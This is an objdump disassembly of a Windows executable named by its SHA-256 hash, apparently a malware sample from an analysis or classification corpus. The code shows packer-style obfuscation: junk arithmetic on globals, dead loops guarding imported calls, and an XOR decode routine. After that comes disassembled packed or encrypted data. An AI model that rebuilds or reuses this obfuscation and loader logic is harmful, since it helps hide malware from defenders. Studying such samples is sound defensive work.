
57b7047c1266635872e5d06e5febca5307875982f2a5396adef3ebc68f644deb.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x425010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x425010
  401020:	inc    eax
  401021:	mov    ds:0x425010,eax
  401026:	cmp    DWORD PTR ds:0x425010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x425010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42500c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x421000
  40105d:	cmp    DWORD PTR ds:0x425010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x425010
  40106f:	inc    eax
  401070:	mov    ds:0x425010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x427010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x427008,0x42601c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x429008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x429008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x429008,ecx
  4010af:	cmp    DWORD PTR ds:0x429008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x429008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x421048
  4010d4:	cmp    DWORD PTR ds:0x429008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x429008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x429008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x427010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x428010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41d1dc
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x429014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x428008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x425024
  40113b:	adc    ecx,DWORD PTR ds:0x427004
  401141:	mov    DWORD PTR ds:0x425024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x42901c
  401150:	sub    DWORD PTR ds:0x42500c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x427004,0x42500c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x429008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x425020,0x1b
  401184:	cmp    DWORD PTR ds:0x425020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x425020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x421004
  4011a7:	mov    ecx,DWORD PTR ds:0x425020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x425020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42501c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42500c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x425024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x428018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x426014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x427010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x425020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x425010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x427014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x426014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x425014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x425000,0x427018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x42901c,0x429008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x428004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x42800c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x426018,0x427004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x429018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x426014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x428018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x425000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x428014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x425020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x425010,0x1f
  401313:	cmp    DWORD PTR ds:0x425010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x425010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x41ff3b
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42104c
  40134b:	mov    edx,DWORD PTR ds:0x425010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x425010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x428008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x425008,0x427004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x426014,0x42701c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x429004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x42801c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x426010
  4013c9:	sbb    DWORD PTR ds:0x42600c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x426018
  4013da:	or     edx,DWORD PTR ds:0x42500c
  4013e0:	mov    DWORD PTR ds:0x426018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x427008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x426010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x425020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x428004
  401417:	sub    DWORD PTR ds:0x42501c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x428004,0x1f
  40143c:	cmp    DWORD PTR ds:0x428004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x428004,0x29
  401450:	jne    0x401466
  401456:	push   0x41ffb1
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x421008
  401466:	mov    ecx,DWORD PTR ds:0x428004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x428004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x429014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42501c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x429018,0x425020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x429010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x429010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x429010,edx
  4014c9:	cmp    DWORD PTR ds:0x429010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x421014
  4014e1:	cmp    DWORD PTR ds:0x429010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x425008,0x0
  401504:	mov    edx,DWORD PTR ds:0x425008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x425008,edx
  401511:	cmp    DWORD PTR ds:0x425008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x41ffd1
  401523:	push   0x41ff0b
  401528:	call   DWORD PTR ds:0x421050
  40152e:	cmp    DWORD PTR ds:0x425008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x429008,0x42900c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x42801c,0x0
  401559:	mov    edx,DWORD PTR ds:0x42801c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x42801c,edx
  401566:	cmp    DWORD PTR ds:0x42801c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x421054
  401583:	cmp    DWORD PTR ds:0x42801c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x426010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x426010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x426010,edx
  4015b7:	cmp    DWORD PTR ds:0x426010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x421018
  4015cd:	cmp    DWORD PTR ds:0x426010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x426000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x425028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x425024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x425024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x425024,edx
  40163b:	cmp    DWORD PTR ds:0x425024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x425024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42101c
  40166b:	cmp    DWORD PTR ds:0x425024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x425024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x425024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x427010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x42900c,0x427008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x425028,0x427010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x426018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	shl    BYTE PTR ds:0x626276e5,0x62
  401913:	bound  ebx,QWORD PTR [edx]
  401915:	pop    edi
  401916:	bound  esp,QWORD PTR [edx+0x9]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x4018b2
  401922:	jbe    0x40199a
  401924:	mov    al,0xa7
  401926:	jb     0x40199a
  401928:	jno    0x401954
  40192a:	fld    st(0)
  40192c:	std    
  40192d:	dec    esp
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	data16 jnp 0x40196b
  401940:	call   0x26d1:0xfbbbb819
  401947:	hlt    
  401948:	xor    BYTE PTR [ebx+0x5811b5de],bl
  40194e:	dec    ebp
  40194f:	and    bl,cl
  401951:	std    
  401952:	pop    ds
  401953:	int    0x30
  401955:	xor    BYTE PTR [ebx+0x79a0c1de],cl
  40195b:	test   al,0x21
  40195d:	mov    al,ds:0x6ad39963
  401962:	clc    
  401963:	cmp    DWORD PTR [edi-0x74],esi
  401966:	mov    ecx,DWORD PTR [ebx+0x38d84edc]
  40196c:	mov    ecx,0x536582b9
  401971:	mov    ch,0x26
  401973:	idiv   BYTE PTR es:[ebx+0x2a413552]
  40197a:	push   es
  40197b:	arpl   sp,bx
  40197d:	push   edi
  40197e:	jne    0x401920
  401980:	and    ch,bh
  401982:	stos   BYTE PTR es:[edi],al
  401983:	adc    al,0xd1
  401985:	cmp    esi,eax
  401987:	mov    al,0x56
  401989:	dec    edi
  40198a:	ret    
  40198b:	adc    al,0x67
  40198d:	and    ebx,DWORD PTR [eax-0x5a2f20df]
  401993:	jmp    0x43e55a22
  401998:	fwait
  401999:	into   
  40199a:	or     al,0xa3
  40199c:	div    DWORD PTR [edi+0x5]
  40199f:	mov    esi,0x9d47fa53
  4019a4:	add    ebx,esi
  4019a6:	retw   0x3f19
  4019aa:	sti    
  4019ab:	retf   0xf32e
  4019ae:	xor    esi,DWORD PTR [ebx]
  4019b0:	or     edi,edx
  4019b2:	and    BYTE PTR [edx+0x78],ah
  4019b5:	or     BYTE PTR [edi+0x32],bl
  4019b8:	mov    esi,0x1cd5b6f1
  4019bd:	lods   al,BYTE PTR ds:[si]
  4019bf:	das    
  4019c0:	sub    BYTE PTR [ecx],al
  4019c2:	inc    edx
  4019c3:	push   0xfc6d943
  4019c8:	or     dl,BYTE PTR [ecx]
  4019ca:	out    dx,eax
  4019cb:	add    BYTE PTR [eax],dl
  4019cd:	sub    edi,ebx
  4019cf:	xacquire xchg DWORD PTR [bx+di-0xb],eax
  4019d4:	mov    al,0x69
  4019d6:	shl    BYTE PTR [eax+edi*2-0x21],cl
  4019da:	jne    0xbc1f99bd
  4019e0:	test   eax,0xf491fea4
  4019e5:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4019e7:	sti    
  4019e8:	(bad)  
  4019e9:	je     0x40199c
  4019eb:	cmc    
  4019ec:	add    eax,0x2a8e213e
  4019f1:	out    0x30,al
  4019f3:	or     al,0x2c
  4019f5:	leave  
  4019f6:	std    
  4019f7:	adc    eax,0x1030d7c1
  4019fc:	mov    edi,0xde84b0b2
  401a01:	fisubr DWORD PTR [eax]
  401a03:	jo     0x4019a4
  401a05:	ins    DWORD PTR es:[edi],dx
  401a06:	aad    0xf6
  401a08:	mov    bh,0x6d
  401a0a:	retf   0x410c
  401a0d:	xchg   esi,eax
  401a0e:	xor    BYTE PTR [edx+0xdc74b06],bh
  401a14:	in     al,dx
  401a15:	dec    esi
  401a16:	xchg   esp,eax
  401a17:	fwait
  401a18:	inc    esp
  401a19:	fisttp WORD PTR [esi+0x6edbc408]
  401a1f:	lock int3 
  401a21:	push   cs
  401a22:	xchg   edi,eax
  401a23:	loopne 0x4019e9
  401a25:	das    
  401a26:	xor    eax,0xc53c09fa
  401a2b:	and    DWORD PTR [edx-0x717ea98e],edi
  401a31:	repnz xor DWORD PTR [ebx],esp
  401a34:	pop    ds
  401a35:	out    dx,eax
  401a36:	std    
  401a37:	aaa    
  401a38:	cmc    
  401a39:	jg     0x401aa2
  401a3b:	jp     0x401a18
  401a3d:	(bad)  
  401a3e:	test   al,0xe4
  401a40:	jg     0x4019cc
  401a42:	ss popa 
  401a44:	jb     0x401a9b
  401a46:	add    eax,0x632c709b
  401a4b:	push   es
  401a4c:	stos   BYTE PTR es:[edi],al
  401a4d:	or     eax,0x56b88aae
  401a52:	(bad)  
  401a53:	pop    ebp
  401a54:	out    0x35,al
  401a56:	or     ch,al
  401a58:	imul   edi,ebp,0x1d
  401a5b:	xchg   BYTE PTR [ecx],ch
  401a5d:	js     0x401a5c
  401a5f:	xchg   ebx,eax
  401a60:	stos   DWORD PTR es:[edi],eax
  401a61:	(bad)  
  401a62:	pop    esp
  401a63:	inc    edi
  401a64:	jmp    0xf3e6:0x89b94fc7
  401a6b:	(bad)
  401a6f:	xor    bl,BYTE PTR [edx+esi*4]
  401a72:	mov    al,ds:0x749cffa1
  401a77:	mov    eax,DWORD PTR [ebx+0x3b]
  401a7a:	test   al,0xf0
  401a7c:	sub    ch,bl
  401a7e:	pop    es
  401a7f:	sbb    eax,0x477435ab
  401a84:	lds    edx,FWORD PTR [edi-0x7eab71d2]
  401a8a:	jge    0x401a60
  401a8c:	mov    dl,0xb3
  401a8e:	(bad)  
  401a8f:	jge    0x401a37
  401a91:	push   edi
  401a92:	repnz push ecx
  401a94:	mov    eax,ds:0x6d1a3111
  401a99:	or     ebx,0x5351b23a
  401a9f:	mov    al,ds:0x57aaa6c0
  401aa4:	shr    ecx,cl
  401aa6:	mov    edi,0x3bd26413
  401aab:	mov    dh,0x9d
  401aad:	and    DWORD PTR [ebp-0x7f],esp
  401ab0:	pop    ebx
  401ab1:	in     eax,dx
  401ab2:	mov    esi,0x41d2fbf8
